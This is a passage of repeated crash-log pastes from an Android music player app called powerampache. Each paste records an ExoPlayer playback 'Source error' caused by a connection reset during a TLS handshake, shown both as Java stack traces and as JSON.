error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}
 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":72},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167905397,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
y75zdDhs,2025-07-19T19:38:29.342,powerampache,PHP,Saturday 19th of July 2025 12:38:29 PM CDT,"1.01-76 (76) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:709)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:236)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.datasource.HttpDataSource$HttpDataSourceException: java.net.SocketException: Connection reset
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:370)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)
Caused by: java.net.SocketException: Connection reset
	at java.net.SocketInputStream.read(SocketInputStream.java:215)
	at java.net.SocketInputStream.read(SocketInputStream.java:144)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.readFromSocket(ConscryptEngineSocket.java:936)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.processDataFromSocket(ConscryptEngineSocket.java:900)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.access$100(ConscryptEngineSocket.java:722)
	at com.android.org.conscrypt.ConscryptEngineSocket.doHandshake(ConscryptEngineSocket.java:238)
	at com.android.org.conscrypt.ConscryptEngineSocket.startHandshake(ConscryptEngineSocket.java:217)
	at com.android.okhttp.internal.io.RealConnection.connectTls(RealConnection.java:196)
	at com.android.okhttp.internal.io.RealConnection.connectSocket(RealConnection.java:153)
	at com.android.okhttp.internal.io.RealConnection.connect(RealConnection.java:116)
	at com.android.okhttp.internal.http.StreamAllocation.findConnection(StreamAllocation.java:186)
	at com.android.okhttp.internal.http.StreamAllocation.findHealthyConnection(StreamAllocation.java:128)
	at com.android.okhttp.internal.http.StreamAllocation.newStream(StreamAllocation.java:97)
	at com.android.okhttp.internal.http.HttpEngine.connect(HttpEngine.java:289)
	at com.android.okhttp.internal.http.HttpEngine.sendRequest(HttpEngine.java:232)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.execute(HttpURLConnectionImpl.java:465)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.connect(HttpURLConnectionImpl.java:131)
	at com.android.okhttp.internal.huc.DelegatingHttpsURLConnection.connect(DelegatingHttpsURLConnection.java:90)
	at com.android.okhttp.internal.huc.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:30)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:644)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:525)
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:364)
	... 7 more

onPlayerError HttpDataSourceException - PlaybackException 
Error Code: 2001. Erreur lors de la lecture de ce morceau.
{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":72},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167902067,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}
 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":72},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167902067,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
UM5mauW0,2025-07-19T19:38:26.024,powerampache,PHP,Saturday 19th of July 2025 12:38:26 PM CDT,"1.01-76 (76) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:709)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:236)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.datasource.HttpDataSource$HttpDataSourceException: java.net.SocketException: Connection reset
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:370)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)
Caused by: java.net.SocketException: Connection reset
	at java.net.SocketInputStream.read(SocketInputStream.java:215)
	at java.net.SocketInputStream.read(SocketInputStream.java:144)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.readFromSocket(ConscryptEngineSocket.java:936)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.processDataFromSocket(ConscryptEngineSocket.java:900)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.access$100(ConscryptEngineSocket.java:722)
	at com.android.org.conscrypt.ConscryptEngineSocket.doHandshake(ConscryptEngineSocket.java:238)
	at com.android.org.conscrypt.ConscryptEngineSocket.startHandshake(ConscryptEngineSocket.java:217)
	at com.android.okhttp.internal.io.RealConnection.connectTls(RealConnection.java:196)
	at com.android.okhttp.internal.io.RealConnection.connectSocket(RealConnection.java:153)
	at com.android.okhttp.internal.io.RealConnection.connect(RealConnection.java:116)
	at com.android.okhttp.internal.http.StreamAllocation.findConnection(StreamAllocation.java:186)
	at com.android.okhttp.internal.http.StreamAllocation.findHealthyConnection(StreamAllocation.java:128)
	at com.android.okhttp.internal.http.StreamAllocation.newStream(StreamAllocation.java:97)
	at com.android.okhttp.internal.http.HttpEngine.connect(HttpEngine.java:289)
	at com.android.okhttp.internal.http.HttpEngine.sendRequest(HttpEngine.java:232)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.execute(HttpURLConnectionImpl.java:465)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.connect(HttpURLConnectionImpl.java:131)
	at com.android.okhttp.internal.huc.DelegatingHttpsURLConnection.connect(DelegatingHttpsURLConnection.java:90)
	at com.android.okhttp.internal.huc.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:30)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:644)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:525)
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:364)
	... 7 more

onPlayerError HttpDataSourceException - PlaybackException 
Error Code: 2001. Erreur lors de la lecture de ce morceau.
